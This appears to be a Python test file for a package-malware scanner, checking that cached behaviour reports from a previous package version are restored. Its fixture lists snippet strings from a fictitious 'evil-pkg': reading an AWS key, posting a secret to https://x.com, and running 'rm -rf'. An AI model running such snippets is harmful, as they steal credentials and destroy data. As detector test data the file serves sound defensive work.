"""_try_load_cached_prev — stage_2_behavior 캐시에서 직전 버전 복원 검증.

격리 DB 에 BehaviorReport 를 직접 put → 같은 키로 _try_load_cached_prev 호출
시 (apis_by_file, files_partial) 반환되는지.
"""
from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pkgsentinel.schema import AttackDimension, Ecosystem
from pkgsentinel.stages.stage2_behavior import APICall, BehaviorReport, FileSequence
from pkgsentinel.stages.stage3b_full_diff import _try_load_cached_prev


def _setup_isolated_db():
    td = tempfile.mkdtemp(prefix="stage3b_cache_")
    os.environ["AISLOP_DB_KEY"] = "stage3b-cache-test"
    from pkgsentinel.db.threat_db import ThreatDB
    import pkgsentinel.db.threat_db as tdb_mod
    db = ThreatDB(
        Path(td) / "test.sqlcipher",
        passphrase=os.environ["AISLOP_DB_KEY"],
    )
    tdb_mod._default_db = db
    return td, db


def _cleanup(td):
    import shutil
    shutil.rmtree(td, ignore_errors=True)


def _build_sample_behavior() -> BehaviorReport:
    """샘플 BehaviorReport — 2개 파일에 의심 calls."""
    f1 = FileSequence(
        path="evil-pkg/setup.py", language="python",
        calls=[
            APICall(
                name="os.environ.get", line=3,
                dimension=AttackDimension.INFORMATION_READING,
                snippet="os.environ.get('AWS_KEY')",
            ),
            APICall(
                name="requests.post", line=5,
                dimension=AttackDimension.DATA_TRANSMISSION,
                snippet="requests.post('https://x.com', data=secret)",
            ),
        ],
    )
    f2 = FileSequence(
        path="evil-pkg/hooks.py", language="python",
        calls=[
            APICall(
                name="subprocess.run", line=2,
                dimension=AttackDimension.PAYLOAD_EXECUTION,
                snippet="subprocess.run(['rm', '-rf'])",
            ),
        ],
    )
    return BehaviorReport(files=[f1, f2])


def test_cache_miss_returns_none_none():
    """캐시 비어 있으면 (None, None)."""
    print("== cache miss → (None, None) ==")
    td, _db = _setup_isolated_db()
    try:
        apis, files = _try_load_cached_prev(
            "never-cached", Ecosystem.PYPI, "1.0.0",
        )
        assert apis is None
        assert files is None
        print("  OK")
    finally:
        _cleanup(td)


def test_cache_hit_returns_apis_and_files():
    print("\n== cache hit → apis_by_file + files_partial ==")
    td, db = _setup_isolated_db()
    try:
        from pkgsentinel.db.stage_cache import StageCache, StageCacheKey
        sc = StageCache()
        key = StageCacheKey(
            package="evil-pkg", ecosystem="PyPI", version="0.0.1",
            stage="stage_2_behavior",
        )
        behavior = _build_sample_behavior()
        sc.put(key, behavior.to_dict())

        apis, files = _try_load_cached_prev(
            "evil-pkg", Ecosystem.PYPI, "0.0.1",
        )
        assert apis is not None
        assert files is not None
        # 정규화 path 로 키 매핑됨
        assert len(apis) == 2
        assert len(files) == 2

        # 호출명 정확
        all_apis = set()
        for s in apis.values():
            all_apis.update(s)
        assert "os.environ.get" in all_apis
        assert "subprocess.run" in all_apis
        print(f"  OK 2 files, apis={sorted(all_apis)}")
    finally:
        _cleanup(td)


def test_files_partial_has_zero_size():
    """캐시 모드의 FullSourceFile placeholder 는 size=0, content=''."""
    print("\n== files_partial: size=0 (new_file 신뢰도 낮음을 의미) ==")
    td, _db = _setup_isolated_db()
    try:
        from pkgsentinel.db.stage_cache import StageCache, StageCacheKey
        sc = StageCache()
        sc.put(
            StageCacheKey(
                package="p", ecosystem="PyPI", version="1.0",
                stage="stage_2_behavior",
            ),
            _build_sample_behavior().to_dict(),
        )
        _apis, files = _try_load_cached_prev("p", Ecosystem.PYPI, "1.0")
        for sf in files.values():
            assert sf.size == 0
            assert sf.content == ""
            assert sf.language in ("python", "javascript")
        print("  OK placeholders")
    finally:
        _cleanup(td)


def test_corrupt_payload_returns_none():
    """payload 가 BehaviorReport 형식이 아니면 graceful (None, None)."""
    print("\n== 손상 payload → (None, None) ==")
    td, _db = _setup_isolated_db()
    try:
        from pkgsentinel.db.stage_cache import StageCache, StageCacheKey
        sc = StageCache()
        sc.put(
            StageCacheKey(
                package="x", ecosystem="PyPI", version="1.0",
                stage="stage_2_behavior",
            ),
            {"completely": "wrong shape", "no": "files key"},
        )
        # BehaviorReport.from_dict 는 빈 결과 반환 (오류 X). 그래서 apis = {} 가 됨.
        apis, files = _try_load_cached_prev("x", Ecosystem.PYPI, "1.0")
        # 빈 dict 이라도 None 아닌 게 정상 — 캐시는 살아 있음
        assert apis is not None
        assert files is not None
        assert len(apis) == 0
        print("  OK empty dict returned")
    finally:
        _cleanup(td)


def main():
    pass


if __name__ == "__main__":
    main()
